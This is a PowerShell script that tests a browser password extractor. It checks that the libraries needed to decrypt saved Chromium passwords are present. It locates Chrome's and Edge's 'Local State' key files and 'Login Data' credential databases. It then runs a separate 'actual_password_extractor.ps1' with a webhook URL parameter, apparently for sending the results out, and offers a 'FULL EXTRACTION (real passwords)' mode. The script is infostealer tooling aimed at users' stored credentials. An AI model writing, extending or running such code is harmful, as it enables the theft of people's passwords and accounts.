# Test script for actual password extraction
# This script will attempt to load SQLite and run the password extractor

Write-Output "=== Testing Actual Password Extraction ==="
Write-Output "Checking system requirements..."

# Check if SQLite assembly is available
try {
    Add-Type -AssemblyName System.Data.SQLite
    Write-Output "✅ SQLite assembly loaded successfully"
    $sqliteAvailable = $true
} catch {
    Write-Output "❌ SQLite assembly not available: $_"
    $sqliteAvailable = $false
}

# Check if AES-GCM is available (.NET 6+ or Windows 10+)
try {
    $aesTest = [System.Security.Cryptography.AesGcm]
    Write-Output "✅ AES-GCM encryption available"
    $aesGcmAvailable = $true
} catch {
    Write-Output "❌ AES-GCM not available: $_"
    $aesGcmAvailable = $false
}

# Check browser data availability
$chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
$edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"

Write-Output "`nBrowser Data Check:"
Write-Output "Chrome Local State: $(if (Test-Path $chromeLocalState) { '✅ Found' } else { '❌ Not Found' })"
Write-Output "Chrome Login Data: $(if (Test-Path $chromeLoginData) { '✅ Found' } else { '❌ Not Found' })"
Write-Output "Edge Local State: $(if (Test-Path $edgeLocalState) { '✅ Found' } else { '❌ Not Found' })"
Write-Output "Edge Login Data: $(if (Test-Path $edgeLoginData) { '✅ Found' } else { '❌ Not Found' })"

if ($sqliteAvailable -and ($chromeLocalState -or $edgeLocalState)) {
    Write-Output "`n🚀 System ready for password extraction!"
    Write-Output "Would you like to run the extraction? (This will extract REAL passwords)"
    Write-Output "Options:"
    Write-Output "1. Run in TEST MODE (passwords masked)"
    Write-Output "2. Run FULL EXTRACTION (real passwords)"
    Write-Output "3. Cancel"
    
    # For automated testing, we'll run in test mode
    Write-Output "`nRunning in TEST MODE for safety..."
    
    # Execute the actual extractor in test mode
    & "$PSScriptRoot\actual_password_extractor.ps1" -TestMode -WebhookUrl "http://localhost:8080"
    
} else {
    Write-Output "`n❌ System not ready for password extraction"
    Write-Output "Missing requirements:"
    if (-not $sqliteAvailable) {
        Write-Output "- SQLite assembly (System.Data.SQLite)"
    }
    if (-not (Test-Path $chromeLocalState) -and -not (Test-Path $edgeLocalState)) {
        Write-Output "- Browser data (Chrome or Edge)"
    }
    
    Write-Output "`nTo install SQLite support:"
    Write-Output "1. Install SQLite NuGet package"
    Write-Output "2. Or download System.Data.SQLite.dll manually"
    Write-Output "3. Or use alternative extraction methods"
}

Write-Output "`nTest completed."
